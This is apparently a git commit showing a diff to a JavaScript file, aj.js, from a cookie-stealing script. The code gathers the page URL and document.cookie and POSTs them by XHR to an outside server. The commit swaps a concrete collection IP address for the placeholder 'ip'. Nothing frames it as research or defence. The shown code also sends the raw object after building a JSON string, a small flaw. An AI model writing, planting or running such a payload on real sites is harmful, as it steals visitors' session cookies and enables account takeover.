5a72a07f71d762bd2de2cbb44099059859d5661a
z-bool <aijhasyleste@gmail.com>
2023-02-07 16:54:06 +0800

    push

--- aj.js
+++ aj.js
@@ -4,6 +4,6 @@ var data={};
 data['url'] = location.toString();
 data['cookie'] = document.cookie;
 var dataString = JSON.stringify(data)
-xhr.open ("POST", "http://8.136.241.0:8999/sa2asdjnh12387zbn", true);
+xhr.open ("POST", "http://ip:8999/sa2asdjnh12387zbn", true);
 xhr.setRequestHeader('Content-type','application/json; charset=utf-8');
 xhr.send(data);
